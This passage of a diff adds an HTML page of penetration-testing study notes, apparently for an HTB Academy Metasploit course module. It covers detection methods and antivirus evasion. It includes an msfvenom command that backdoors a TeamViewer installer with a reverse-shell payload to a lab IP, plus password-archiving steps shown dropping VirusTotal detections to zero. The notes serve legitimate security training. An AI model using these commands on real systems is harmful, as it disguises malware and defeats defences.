+        <div class="card">
+          <div class="card-title">Perimeter protection</div>
+          <p>Physical/virtual devices at the network edge that gate access between public and private zones.</p>
+        </div>
+        <div class="card">
+          <div class="card-title">DMZ</div>
+          <p>A zone between public and private — lower policy than internal, higher trust than the open Internet. Hosts public-facing servers managed from the inside.</p>
+        </div>
+      </div>
+      <h3>How events match a security policy</h3>
+      <table>
+        <tr><th>Method</th><th>Description</th></tr>
+        <tr><td>Signature-based</td><td>Compares packets against pre-built attack patterns. A 100% match raises an alarm.</td></tr>
+        <tr><td>Heuristic / Anomaly</td><td>Behavioral comparison against a baseline (incl. known-APT modus operandi). Threshold deviations alarm.</td></tr>
+        <tr><td>Stateful Protocol Analysis</td><td>Detects protocol divergence vs. vendor profiles of accepted, non-malicious activity.</td></tr>
+        <tr><td>Live Monitoring (SOC)</td><td>Analysts watch a live feed and action threats manually or via automation.</td></tr>
+      </table>
+    </section>
+
+    <!-- 11 EVASION TECHNIQUES -->
+    <section id="evasion">
+      <div class="section-head"><span class="section-num">11</span><span class="section-title">Evasion Techniques</span></div>
+      <p>Most host AV relies on <b>signature-based detection</b>. Encoding with multiple iterations isn't enough for all AV, and simply establishing a C2 channel can trip IDS/IPS.</p>
+
+      <h3>AES-encrypted tunnels (MSF6)</h3>
+      <p>MSF6 tunnels AES-encrypted Meterpreter traffic back to the attacker, handling most network IDS/IPS. Combined with Meterpreter running <b>in memory</b>, this raises capability significantly. Strict rulesets may still flag by source IP — the workaround is to use allowed services. (cf. the 2017 Equifax breach: Apache Struts + DNS exfiltration, unnoticed for months.)</p>
+      <div class="alert">The remaining problem is the payload <b>file</b> before it runs — it can be fingerprinted and blocked. AV vendors add default MSF payloads to their databases, so most defaults are caught immediately.</div>
+
+      <h3>Executable templates (backdooring)</h3>
+      <p>Inject a payload into a legitimate executable to hide shellcode inside real program code.</p>
+      <div class="code-block"><span class="prompt">$ </span>msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k \
+  -x ~/Downloads/TeamViewer_Setup.exe \
+  -e x86/shikata_ga_nai -a x86 --platform windows \
+  -o ~/Desktop/TeamViewer_Setup.exe -i 5</div>
+      <div class="alert alert-blue"><b>-k flag:</b> runs the payload in a separate thread so the original app keeps executing normally. Launched from a CLI, a separate window pops up that stays open until the session ends.</div>
+
+      <h3>Archives</h3>
+      <p>Archiving and <b>password-protecting</b> a payload bypasses many AV signatures. Downside: AV dashboards flag the locked archive as "unable to scan," which an admin can inspect manually.</p>
+      <table>
+        <tr><th>Stage</th><th>VirusTotal</th></tr>
+        <tr><td>Raw encoded <code>test.js</code></td><td>11 / 59 detections (<code>Shikata.Gen</code>)</td></tr>
+        <tr><td>Double-archived + password, extension stripped</td><td>0 / 49 detections</td></tr>
+      </table>
+      <div class="code-block"><span class="prompt">$ </span>rar a ~/test.rar -p ~/test.js   <span class="comment"># password-protected</span>
+<span class="prompt">$ </span>mv test.rar test                <span class="comment"># strip .rar extension</span>
+<span class="prompt">$ </span>rar a test2.rar -p test          <span class="comment"># archive again</span>
+<span class="prompt">$ </span>mv test2.rar test2
+<span class="prompt">$ </span>msf-virustotal -k <span class="hl">&lt;API key&gt;</span> -f test2   <span class="comment"># 0 / 49</span></div>
+
+      <h3>Packers</h3>
+      <p>A packer compresses a payload + executable + decompression code into one file; at runtime the original backdoored executable is restored in memory. <code>msfvenom</code> can compress, restructure, and encrypt the process structure.</p>
+      <p><b>Popular:</b> UPX, The Enigma Protector, MPRESS, Alternate EXE Packer, ExeStealth, Morphine, MEW, Themida. See the <em>PolyPack</em> project.</p>
+
+      <h3>Exploit coding</h3>
+      <p>Avoid easily fingerprinted code. BoF hex patterns stand out to IDS/IPS — add randomization via the <code>Offset</code> and avoid obvious NOP sleds. Test custom exploit code against a sandbox before deploying on a client network.</p>
+      <div class="code-block"><span class="ps">'Targets'</span> =&gt;
+[
+    [ <span class="hl">'Windows 2000 SP4 English'</span>, { 'Ret' =&gt; 0x77e14c29, 'Offset' =&gt; 5093 } ],
+],</div>
+      <div class="alert alert-blue">This section is a high-level overview — evasion is covered more deeply in later modules. Practice against older HTB machines or VMs with older Windows Defender / free AV engines.</div>
+    </section>
+
+    <div class="footer">
+      <span>// MODULE 08 — METASPLOIT FRAMEWORK · HTB ACADEMY · CPTS</span>
+      <span>leviathan516.github.io</span>
+    </div>
+
+  </main>
+</div>
+
+</body>
+</html>
